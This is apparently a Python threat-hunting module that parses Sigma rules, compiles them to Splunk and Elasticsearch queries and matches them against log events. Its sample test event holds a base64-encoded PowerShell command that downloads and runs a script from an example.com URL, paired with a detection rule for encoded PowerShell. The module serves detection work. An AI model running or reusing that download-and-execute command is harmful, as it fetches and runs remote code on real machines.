#!/usr/bin/env python3
"""
Cyber Hashira - Sigma & YARA Threat Hunting Rule Engine
Features:
  - Parses Sigma YAML Detection Rules:
      * Metadata (title, status, tags, author, date)
      * Logsource (category: process_creation, product: windows/linux)
      * Detection definitions (selection, filters, conditions)
  - Translates Sigma rules into:
      * Splunk SPL queries
      * Elastic / OpenSearch Lucene & KQL queries
  - In-memory event stream evaluation: Matches rules against incoming log events
  - Emits structured SOC detection findings mapped to MITRE ATT&CK
"""

import sys
import json
import uuid
import re
import datetime

class ScopeGuard:
    @staticmethod
    def is_authorized(target: str, authorized_targets: list) -> bool:
        if not target:
            return True
        clean_target = target.strip().lower()
        for auth in authorized_targets:
            if clean_target == auth.strip().lower() or clean_target.startswith(auth.strip().lower()):
                return True
        return False

def parse_sigma_rule(content: str) -> dict:
    rule = {
        "title": "Generic Detection Rule",
        "id": str(uuid.uuid4()),
        "status": "experimental",
        "tags": [],
        "logsource": {},
        "selection": {},
        "condition": "selection"
    }
    
    in_detection = False
    in_selection = False
    in_logsource = False

    for line in content.splitlines():
        trimmed = line.strip()
        if not trimmed or trimmed.startswith("#"):
            continue

        if line.startswith("title:"):
            rule["title"] = line.split(":", 1)[1].strip()
        elif line.startswith("id:"):
            rule["id"] = line.split(":", 1)[1].strip()
        elif line.startswith("status:"):
            rule["status"] = line.split(":", 1)[1].strip()
        elif line.startswith("tags:"):
            pass
        elif line.strip().startswith("- attack."):
            rule["tags"].append(line.strip().lstrip("-").strip())
        elif line.startswith("logsource:"):
            in_logsource = True
            in_detection = False
        elif line.startswith("detection:"):
            in_detection = True
            in_logsource = False
        elif in_logsource and line.startswith("  "):
            parts = trimmed.split(":", 1)
            if len(parts) == 2:
                rule["logsource"][parts[0].strip()] = parts[1].strip()
        elif in_detection and line.startswith("  selection:"):
            in_selection = True
        elif in_detection and in_selection and line.startswith("    "):
            parts = trimmed.split(":", 1)
            if len(parts) == 2:
                k = parts[0].strip()
                v = parts[1].strip().strip("'\"")
                rule["selection"][k] = v
        elif in_detection and line.startswith("  condition:"):
            rule["condition"] = line.split(":", 1)[1].strip()

    return rule

def compile_to_splunk(rule: dict) -> str:
    tokens = []
    logsource = rule.get("logsource", {})
    if logsource.get("category") == "process_creation":
        tokens.append('(EventCode=4688 OR EventCode=1)')

    for k, v in rule.get("selection", {}).items():
        field_name = k.split("|")[0]
        if field_name.lower() in ["image", "process"]:
            field = "process_name"
        elif field_name.lower() in ["commandline", "process.command_line"]:
            field = "CommandLine"
        else:
            field = field_name

        tokens.append(f'{field}="*{v}*"')

    return "index=security " + " ".join(tokens)

def compile_to_elasticsearch(rule: dict) -> str:
    clauses = []
    logsource = rule.get("logsource", {})
    if logsource.get("category") == "process_creation":
        clauses.append('(winlog.event_id: 4688 OR winlog.event_id: 1)')

    for k, v in rule.get("selection", {}).items():
        field_name = k.split("|")[0]
        if field_name.lower() in ["image", "process"]:
            field = "process.name"
        elif field_name.lower() in ["commandline"]:
            field = "process.command_line"
        else:
            field = field_name

        clauses.append(f'{field}: *{v}*')

    return " AND ".join(clauses)

def match_event(event: dict, selection: dict) -> bool:
    for k, v in selection.items():
        field = k.split("|")[0]
        modifier = k.split("|")[1] if "|" in k else "exact"
        event_val = str(event.get(field, event.get(field.lower(), "")))

        if modifier == "endswith":
            if not event_val.lower().endswith(v.lower()):
                return False
        elif modifier in ["contains", "all"]:
            if v.lower() not in event_val.lower():
                return False
        else:
            if v.lower() not in event_val.lower() and v != event_val:
                return False
    return True

def handle_execute(req):
    options = req.get("options", {})
    target = req.get("target") or req.get("siem_endpoint", "")
    authorized_targets = options.get("authorized_targets", [])

    if target and authorized_targets:
        if not ScopeGuard.is_authorized(target, authorized_targets):
            return {
                "status": "error",
                "code": "SCOPE_VIOLATION",
                "message": f"Target '{target}' is not in authorized scope: {authorized_targets}"
            }

    rule_content = req.get("rule_content") or options.get("rule_content", "")
    if not rule_content:
        # Default Sigma rule for Encoded PowerShell Execution
        rule_content = """
title: Suspicious PowerShell Encoded Command Execution
id: 3b6ab520-213c-4b68-87d3-6e7e00e42718
status: stable
tags:
  - attack.execution
  - attack.t1059.001
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: powershell.exe
    CommandLine|contains: -enc
  condition: selection
        """

    rule = parse_sigma_rule(rule_content)
    splunk_query = compile_to_splunk(rule)
    es_query = compile_to_elasticsearch(rule)

    events = req.get("log_events") or options.get("log_events", [])
    if not events:
        # Sample test events
        events = [
            {
                "EventID": 4688,
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcwAnACkA",
                "User": "NT AUTHORITY\\SYSTEM"
            },
            {
                "EventID": 4688,
                "Image": "C:\\Windows\\System32\\notepad.exe",
                "CommandLine": "notepad.exe C:\\notes.txt",
                "User": "admin"
            }
        ]

    matched_events = []
    findings = []

    for ev in events:
        if match_event(ev, rule.get("selection", {})):
            matched_events.append(ev)
            findings.append({
                "id": str(uuid.uuid4()),
                "title": f"Sigma Detection Alert: {rule['title']}",
                "severity": "critical",
                "cvss_score": 9.2,
                "rule_id": rule.get("id"),
                "mitre_tags": rule.get("tags", []),
                "matched_event": ev,
                "description": f"Log event triggered rule '{rule['title']}' matching suspicious pattern.",
                "remediation": "Isolate the endpoint, terminate offending parent processes, and inspect parent execution lineage."
            })

    target_siem = req.get("target_siem") or options.get("target_siem", "splunk")
    active_query = splunk_query if target_siem.lower() == "splunk" else es_query

    return {
        "status": "success",
        "result": {
            "rule_title": rule.get("title"),
            "rule_id": rule.get("id"),
            "mitre_tags": rule.get("tags", []),
            "target_siem": target_siem,
            "compiled_query": active_query,
            "splunk_spl": splunk_query,
            "elasticsearch_kql": es_query,
            "total_events_analyzed": len(events),
            "matched_events_count": len(matched_events),
            "matched_events": matched_events,
            "findings": findings,
            "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
        }
    }

def main():
    for line in sys.stdin:
        line = line.strip()
        if not line:
            continue
        try:
            req = json.loads(line)
        except Exception as e:
            sys.stdout.write(json.dumps({"status": "error", "message": f"Malformed JSON: {e}"}) + "\n")
            sys.stdout.flush()
            continue

        req_type = req.get("type", "Execute")
        if req_type == "HealthCheck":
            res = {"status": "ok", "module": "sigma-threat-hunting", "version": "1.0.0"}
        else:
            res = handle_execute(req)

        sys.stdout.write(json.dumps(res) + "\n")
        sys.stdout.flush()

if __name__ == "__main__":
    main()
